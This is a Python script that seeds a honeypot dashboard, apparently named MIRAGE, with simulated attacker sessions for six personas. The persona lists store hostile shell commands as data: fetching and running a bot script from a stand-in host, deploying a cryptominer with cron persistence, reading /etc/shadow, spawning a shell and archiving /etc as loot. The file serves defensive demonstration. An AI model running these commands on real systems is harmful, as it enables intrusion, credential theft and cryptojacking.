#!/usr/bin/env python3
"""
MIRAGE — Seed Demo Data Generator
===================================
Generates 80–100 realistic simulated attacker sessions across 6 distinct
personas for development and dashboard demonstration.

Usage::

    python seed_demo_data.py            # append demo data
    python seed_demo_data.py --clean    # wipe existing data first

No LLM/AI calls — all data is procedurally generated.
"""

import argparse
import os
import random
import sys
from datetime import datetime, timedelta

# ── Ensure project root is importable ───────────────────────────────────────
_PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

from database.db import init_db, get_db, close_db  # noqa: E402


# ── Helpers ─────────────────────────────────────────────────────────────────

def _rand_ip(prefix: str) -> str:
    """Generate a random IP with a given first-octet prefix."""
    parts = prefix.split('.')
    while len(parts) < 4:
        parts.append(str(random.randint(1, 254)))
    return '.'.join(parts)


def _random_ts(base: datetime, spread_days: int = 14) -> datetime:
    """Return a random timestamp within the last ``spread_days`` days."""
    offset = random.uniform(0, spread_days * 86400)
    return base - timedelta(seconds=offset)


# ── IP pools per country ───────────────────────────────────────────────────

COUNTRY_IPS = {
    'CN': ['43.225', '103.72', '112.65', '218.92', '61.177'],
    'RU': ['95.142', '185.220', '45.146', '77.247', '91.243'],
    'BR': ['177.52', '201.87', '189.112', '200.229', '186.250'],
    'VN': ['113.160', '103.28', '42.118', '14.241', '171.248'],
    'US': ['104.236', '198.51', '64.227', '159.89', '192.81'],
    'DE': ['185.163', '195.201', '116.202', '78.46', '88.99'],
    'RO': ['89.238', '188.138', '5.2', '79.114', '86.123'],
    'UA': ['91.207', '176.36', '195.46', '178.137', '93.170'],
    'NL': ['185.100', '51.15', '89.248', '141.98', '192.42'],
    'KR': ['121.78', '211.234', '175.196'],
    'IN': ['122.176', '49.36', '103.21'],
    'JP': ['133.242', '163.43', '45.76'],
}


# ── Persona definitions ────────────────────────────────────────────────────

PERSONAS = [
    {
        'name': 'Botnet Deployer',
        'count': 20,
        'protocol': 'ssh',
        'countries': ['CN', 'RU'],
        'timing': (100, 500),       # ms — regular / bot
        'commands': [
            'uname -a',
            'wget http://malware.evil/bot.sh -O /tmp/bot.sh',
            'chmod +x /tmp/bot.sh',
            '/tmp/bot.sh',
            'cat /proc/cpuinfo',
        ],
    },
    {
        'name': 'Credential Harvester',
        'count': 15,
        'protocol': 'ssh',
        'countries': ['BR', 'VN'],
        'timing': (200, 600),       # ms — regular / bot
        'commands': [
            'cat /etc/passwd',
            'cat /etc/shadow',
            'cat /etc/group',
            'whoami',
            'id',
            'last',
            'history -c',
        ],
    },
    {
        'name': 'Recon Scanner',
        'count': 15,
        'protocol': 'ssh',
        'countries': ['US', 'DE'],
        'timing': (500, 5000),      # ms — human-like / irregular
        'commands': [
            'uname -a',
            'ifconfig',
            'ps aux',
            'netstat -antp',
            'cat /etc/hosts',
            'df -h',
            'free -m',
            'ls -la /',
            'cat /etc/os-release',
        ],
    },
    {
        'name': 'Cryptominer Deployer',
        'count': 15,
        'protocol': 'ssh',
        'countries': ['RO', 'UA'],
        'timing': (100, 300),       # ms — bot
        'commands': [
            'wget http://pool.mining/xmrig',
            'chmod 777 xmrig',
            'nohup ./xmrig -o stratum+tcp://pool.minexmr.com:4444',
            'crontab -l',
            "echo '*/5 * * * * /tmp/xmrig' >> /var/spool/cron/root",
        ],
    },
    {
        'name': 'Manual Hacker',
        'count': 10,
        'protocol': 'ssh',
        'countries': ['NL', 'US'],
        'timing': (1000, 15000),    # ms — clearly human
        'commands': [
            'whoami',
            'sudo -l',
            'find / -perm -4000',
            'cat /etc/sudoers',
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            'ssh root@192.168.1.1',
            'tar czf /tmp/loot.tar.gz /etc/',
        ],
    },
    {
        'name': 'HTTP Scanner',
        'count': 15,
        'protocol': 'http',
        'countries': ['CN', 'KR', 'IN', 'JP', 'DE'],
        'timing': (50, 200),        # ms — scanner
        'commands': [
            'GET /.env',
            'GET /config',
            'GET /api/users',
            'POST /login',
            'GET /debug/config',
            'GET /admin',
            'GET /.git/config',
            'GET /wp-admin',
            'GET /phpmyadmin',
        ],
    },
]


# ── Main generation logic ──────────────────────────────────────────────────

def _generate_sessions(db) -> dict:
    """Generate all demo sessions and return summary statistics."""
    now = datetime.utcnow()
    stats = {'sources': 0, 'sessions': 0, 'commands': 0}

    for persona in PERSONAS:
        for _ in range(persona['count']):
            # ── Pick country & IP ───────────────────────────────────────
            country = random.choice(persona['countries'])
            prefix = random.choice(COUNTRY_IPS[country])
            ip = _rand_ip(prefix)

            # ── Session timestamps ──────────────────────────────────────
            session_start = _random_ts(now, spread_days=14)

            # Build command list (use 3–all commands for variety)
            num_cmds = random.randint(
                max(3, len(persona['commands']) - 2),
                len(persona['commands']),
            )
            selected_cmds = random.sample(persona['commands'], num_cmds)

            # ── Compute command timestamps ──────────────────────────────
            cmd_timestamps = [session_start]
            for _ in range(1, num_cmds):
                lo, hi = persona['timing']
                delta_ms = random.randint(lo, hi)
                cmd_timestamps.append(
                    cmd_timestamps[-1] + timedelta(milliseconds=delta_ms)
                )

            session_end = cmd_timestamps[-1]
            duration = int((session_end - session_start).total_seconds())

            # ── Upsert source ───────────────────────────────────────────
            db.execute(
                """
                INSERT INTO sources (ip_address, first_seen, last_seen, country, session_count)
                VALUES (?, ?, ?, ?, 1)
                ON CONFLICT(ip_address) DO UPDATE SET
                    last_seen    = MAX(last_seen, excluded.last_seen),
                    first_seen   = MIN(first_seen, excluded.first_seen),
                    session_count = session_count + 1
                """,
                (
                    ip,
                    session_start.isoformat(),
                    session_end.isoformat(),
                    country,
                ),
            )
            stats['sources'] += 1

            # ── Insert session ──────────────────────────────────────────
            cur = db.execute(
                """
                INSERT INTO sessions (source_ip, protocol, start_time, end_time, duration_seconds)
                VALUES (?, ?, ?, ?, ?)
                """,
                (
                    ip,
                    persona['protocol'],
                    session_start.isoformat(),
                    session_end.isoformat(),
                    duration,
                ),
            )
            session_id = cur.lastrowid
            stats['sessions'] += 1

            # ── Insert commands ─────────────────────────────────────────
            for seq, (cmd, ts) in enumerate(
                zip(selected_cmds, cmd_timestamps), start=1
            ):
                if seq == 1:
                    time_since_prev = None
                else:
                    time_since_prev = int(
                        (ts - cmd_timestamps[seq - 2]).total_seconds() * 1000
                    )
                db.execute(
                    """
                    INSERT INTO commands
                        (session_id, sequence_number, raw_input, timestamp, time_since_prev_ms)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (session_id, seq, cmd, ts.isoformat(), time_since_prev),
                )
                stats['commands'] += 1

    db.commit()
    return stats


def _clean(db) -> None:
    """Remove all existing data (useful for re-seeding)."""
    for table in [
        'session_techniques',
        'commands',
        'sessions',
        'sources',
        'clusters',
    ]:
        db.execute(f'DELETE FROM {table}')
    db.commit()
    print('[MIRAGE] Existing data cleared.')


def main() -> None:
    parser = argparse.ArgumentParser(
        description='MIRAGE — Seed demo attacker sessions',
    )
    parser.add_argument(
        '--clean',
        action='store_true',
        help='Remove all existing data before seeding',
    )
    args = parser.parse_args()

    # Initialise DB (creates tables + seeds signatures if needed)
    init_db()
    db = get_db()

    if args.clean:
        _clean(db)

    stats = _generate_sessions(db)

    print()
    print('=' * 60)
    print('  MIRAGE Demo Data — Generation Summary')
    print('=' * 60)
    print(f"  Sources (unique IPs) inserted:  {stats['sources']}")
    print(f"  Sessions generated:             {stats['sessions']}")
    print(f"  Commands inserted:              {stats['commands']}")
    print()

    # Per-persona breakdown
    print('  Per-persona breakdown:')
    for persona in PERSONAS:
        print(f"    • {persona['name']:<25} {persona['count']:>3} sessions  "
              f"({persona['protocol'].upper()})")
    print('=' * 60)

    close_db()


if __name__ == '__main__':
    main()
